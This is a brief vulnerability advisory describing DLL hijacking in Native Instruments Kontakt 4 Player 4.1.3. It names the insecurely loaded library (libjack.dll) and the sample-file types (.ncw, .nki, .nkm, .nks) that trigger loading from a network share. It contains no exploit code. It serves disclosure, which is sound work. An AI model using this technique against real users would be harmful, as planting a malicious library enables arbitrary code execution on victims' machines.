 Native Instruments Kontakt 4 Player v4.1.3 Insecure Library Loading Vulnerability


 Vendor: Native Instruments GmbH
 Product web page: http://www.native-instruments.com
 Affected version: 4.1.3.4125 (Standalone)

 Summary: KONTAKT 4 PLAYER is the free sample player based on award-winning KONTAKT
 technology. Expanding the capabilities of its successful predecessor, the free
 KONTAKT 4 PLAYER allows for innovative, highly playable instruments leaving technological
 and musical limitations behind.

 Desc: Kontakt Player 4 suffers from a DLL hijacking vulnerability, which could be
 exploited by remote attackers to compromise a vulnerable system. This issue is
 caused due to the application insecurely loading certain libraries ("libjack.dll")
 from the current working directory, which could allow attackers to execute arbitrary
 code by tricking a user into opening specific related files (.ncw, .nki, .nkm and .nks)
 from a network share.

 Tested on: Microsoft Windows XP Professional SP3 (English)
